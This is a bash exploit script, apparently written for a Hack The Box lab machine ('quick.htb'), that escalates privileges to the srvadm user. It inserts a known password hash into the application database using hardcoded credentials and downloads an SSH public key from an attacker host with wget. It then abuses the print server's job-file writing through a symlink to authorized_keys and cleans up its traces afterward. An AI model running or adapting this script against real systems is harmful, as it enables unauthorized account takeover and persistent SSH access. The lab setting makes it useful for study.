#!/bin/bash

# Adding a new password for the user srvadm in the database. This keeps the original password in tact and still allows us access. Database creds were found through enumeration.
echo ""
echo [*] Updating the database to add a known password to the server...
echo 'DELETE FROM users WHERE password="bc2bc58156a161411cca0bc838678e88";' | mysql -h localhost -u db_adm -pdb_p4ss -D quick 2>/dev/null
echo 'INSERT into users (name,email,password) VALUES ("Server Admin","srvadm@quick.htb","bc2bc58156a161411cca0bc838678e88");' | mysql -h localhost -u db_adm -pdb_p4ss -D quick 2>/dev/null
echo ""
cd /var/www/jobs

# Grabbing the public key from the webserver
echo [*] Downloading the public key...
wget -q http://10.10.14.8/sam_rsa.pub -O /var/www/jobs/sam_rsa.pub 1>/dev/null

# Exploiting the fact that the print server will write to a file (name based on date/time stamp). We link the file it's expecting to the /home/srvadm/.ssh/authorized_keys file and have the print server (executing with srvadm permissions) write our public key to the file.
# Saving the public key contents to a variable
pubkey=`cat sam_rsa.pub`

# Establishing a session to grab the cookie
cookie=`curl -s -i -X POST -H 'Host: printerv2.quick.htb' -d"email=srvadm%40quick.htb&password=marlaspassword" http://127.0.0.1/index.php | grep Set-Cookie | cut -d ' ' -f 2 | cut -d ';' -f 1`

# Creating the symbolic link between the authorized_keys file and the file in the jobs directory
echo ""
echo [*] Creating a linked file to srvadm\'s authorized keys and sending the payload...
filename=`date +%F_%T`
ln -s /home/srvadm/.ssh/authorized_keys $filename

# Sending the exploit
curl -s -X 'POST' -H 'Host: printerv2.quick.htb' -H "Cookie: $cookie" -d "title=marlas&submit=" --data-urlencode "desc=$pubkey" http://127.0.0.1/job.php 1>/dev/null

# Cleanup
rm /var/www/jobs/sam_rsa.pub
rm /var/www/jobs/$filename
